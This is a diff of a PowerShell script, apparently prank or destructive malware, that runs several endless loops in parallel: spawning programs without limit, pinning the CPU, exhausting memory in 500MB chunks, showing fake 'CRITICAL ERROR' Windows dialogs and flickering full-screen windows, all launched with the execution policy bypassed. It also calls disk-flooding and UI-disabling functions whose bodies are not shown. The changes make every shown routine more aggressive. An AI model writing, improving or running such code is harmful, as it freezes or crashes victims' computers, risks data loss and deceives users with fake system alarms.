@@ -2,34 +2,32 @@ $wshell = New-Object -ComObject WScript.Shell
 
 function Open-EndlessPrograms {
     while ($true) {
-        Start-Process -NoNewWindow -FilePath notepad
-        Start-Process -NoNewWindow -FilePath cmd
-        Start-Process -NoNewWindow -FilePath explorer
-        Start-Process -NoNewWindow -FilePath calc
-        Start-Process -NoNewWindow -FilePath mspaint
+        Start-Process notepad
+        Start-Process cmd
+        Start-Process explorer
+        Start-Process calc
+        Start-Process mspaint
+        Start-Process write
+        Start-Process powershell
     }
 }
 
 function Overload-CPU {
     while ($true) {
-        Start-Process -NoNewWindow -Priority High -FilePath powershell -ArgumentList {
-            while ($true) { 1..1000000 | ForEach-Object { [math]::Pow($_, 2) } }
-        }
+        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command { while (`$true) { 1..1000000 | % { [math]::Pow(`$_, 2) } } }"
     }
 }
 
 function Overload-RAM {
     $array = @()
     while ($true) {
-        $array += , (New-Object byte[] (200MB))  # Consumes 200MB per iteration
+        $array += , (New-Object byte[] (500MB))  # Consumes 500MB per loop
     }
 }
 
 function Spam-ErrorMessages {
     while ($true) {
-        Start-Process -NoNewWindow -FilePath powershell -ArgumentList {
-            [System.Windows.Forms.MessageBox]::Show("CRITICAL ERROR: SYSTEM FAILURE!", "Windows Error", 0, 16)
-        }
+        [System.Windows.Forms.MessageBox]::Show("CRITICAL ERROR: SYSTEM OVERLOAD!", "Windows Error", 0, 16)
     }
 }
 
@@ -56,18 +54,18 @@ function Glitch-Screen {
         $form.TopMost = $true
         $form.FormBorderStyle = "None"
         $form.Show()
-        Start-Sleep -Milliseconds 30
+        Start-Sleep -Milliseconds 20
         $form.Close()
     }
 }
 
-# RUN ALL CHAOTIC FUNCTIONS IN PARALLEL
-Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Open-EndlessPrograms }"
-Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Overload-CPU }"
-Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Overload-RAM }"
-Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Spam-ErrorMessages }"
-Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Flood-Disk }"
-Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Disable-UI }"
-Start-Process -NoNewWindow powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Glitch-Screen }"
+# RUN ALL CHAOTIC FUNCTIONS IMMEDIATELY
+Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Open-EndlessPrograms }"
+Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Overload-CPU }"
+Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Overload-RAM }"
+Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Spam-ErrorMessages }"
+Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Flood-Disk }"
+Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Disable-UI }"
+Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -Command { Glitch-Screen }"
 
 while ($true) { Start-Sleep 1 }
